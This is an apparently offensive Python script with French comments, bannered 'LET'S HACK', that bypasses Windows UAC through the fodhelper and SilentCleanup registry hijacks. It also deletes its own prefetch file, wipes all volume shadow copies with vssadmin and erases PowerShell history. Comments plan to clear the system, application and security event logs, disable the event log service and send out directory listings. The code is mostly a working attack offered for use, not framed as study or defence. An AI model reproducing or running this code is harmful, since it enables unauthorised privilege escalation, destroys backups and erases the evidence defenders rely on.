import os
import time
import sys
import re
import pyfiglet
"""
A faire : 
Delete le prefetch
Supprimer les shadow copies
Delete l'exe
clear des logs windows ==> wevtutil cl system ; wevtutil cl application ; wevtutil cl security
delete les fichiers qui pourraient etre créé (Secure Delete) ==> Voir Sdelete
Delete les commandes powershell => Clear-History && C:\\Users\\Clément\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
"""

ascii_banner = pyfiglet.figlet_format("LET'S  HACK \n")
print(ascii_banner)

file = sys.argv[0].upper()
#print(f"This is the name of the script: {file}")
#Ici on récupère le nom de l'exe, meme si le nom a été changé on pourra quand meme retrouver le prefetch
len_path = len(os.getcwd())
#print(len_path)
len_file = len(file)
#print(len_file)
len_path_file = len_file - len_path -1
#Permet d'enlever le /
#print(len_path_file)
print(file[-len_path_file:])
#print(file[:len_file])
#print(file[-len_file:])


def bypass_uac_1(commande):
	# La variable "cmd" etant celle passée en argument il faut la changer selon ce qu'il est demandé de faire
	cmd = f"C:\Windows\System32\cmd.exe \k {commande}"
	#Ajouter une possibilité pour changer une clé de registre
	os.system(f'reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "{cmd}" /f')
	os.system('reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f')
	os.popen('fodhelper.exe')


def bypass_uac_2():
	#Necessite AV désactivé
	cmd = "C:\Windows\System32\cmd.exe &REM"
	os.system(f'reg add "HKCU\Environment" /v "windir" /d "{cmd}" /f') #On réécrit la variable d'env windir
	os.system('schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
	#Voir DLL hijack pour une meilleure réussite car flag par windows defender

def detect_uac():
	try:
		username = os.environ['username']
		stream = os.popen(f'net user {username} | findstr Admin')
		output = stream.read()
		if len(output) != 0: #Si réponse alors il fait parti du grp admin
			print("Yeah Admin")
			get_uac = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA') 
			output_uac = get_uac.read()
			output_uac = int(output_uac)
			if output_uac == 1: #Regarde si UAC est activé
				print("UAC is enabled")
				#On veut connaitre le niveau de l'UAC
				uac_value = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin')
				output_uac_value = uac_value.read()
				output_uac_value = int(output_uac_value)
				print(output_uac_value)
				if output_uac_value == 2:
					print("Always notify")
					bypass_uac_2()
				else: 
					print("Easy Bypass")
					bypass_uac_1()

			else:
				print("UAC not enabled\n no need to bypass")
			
			"""
			Permet de connaitre le mandatory group
			Erreur d'encoding
			stream1 = os.popen('whoami /groups | findstr Nom')
			output1 = stream1.read()
			print(output1)
			"""
		else:
			print("Not admin :/")
	except:
		pass
	



def delete_prefetch():
	windows = os.environ['WINDIR'] + "\Prefetch"
	#time.sleep(15)
	#On attend 15 secondes le temps que le prefetch se créer.
	try:
		#Permet de lister les prefetch
		prefetch_files = os.listdir(windows)
		for pf_file in prefetch_files:
		    if pf_file[:len_path_file] == file[-len_path_file:]:
		    	print("File found :" + pf_file)
		    	print(windows + "\\" + pf_file)
		    	try:
		    		os.remove(windows + "\\" + pf_file)
		    		print("Successfully deleted")
		    	except:
		    		print("Impossible to delete file")
		    	break
	except OSError as e:
		print(f"Os Error:{e}")


#Pour les VSS avec le cmd vssadmin List Shadows 
# Voir https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html#:~:text=Your%20shadow%20copies%20are%20generally,folder%20(hidden%20by%20default).
#Il faut etre admin

#os.system('vssadmin List Shadows')
def vss():
	
	try:
		volume = os.environ['SystemDrive']
		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
		bypass_uac_1(commande)

	except Exception as e:
		print(e)


def powershell_history():
	location = os.environ['appdata'] + "\\Microsoft\\Windows\\PowerShell\\PSReadline"
	try:
		os.popen('powershell.exe Clear-History')
		os.remove(location + "\\" + "ConsoleHost_history.txt")
		print("Successfully deleted")
	except Exception as e:
		print(e)
"""
def clear_logs():
	#Run as admin (bypass UAC)
	#sc config eventlog start= disabled
	#wevtutil cl system ; wevtutil cl application ; wevtutil cl security
	#Effacer ses traces : Pour bypass l'UAC
	#reg delete "HKCU\Software\Classes\.thm\" /f
	#reg delete "HKCU\Software\Classes\ms-settings\" /f
"""


detect_uac()
"""
delete_prefetch()
vss()
powershell_history()
"""
#Pour lister les répertoire et les envoyer
#dir /path/ >> %temp%/nom.txt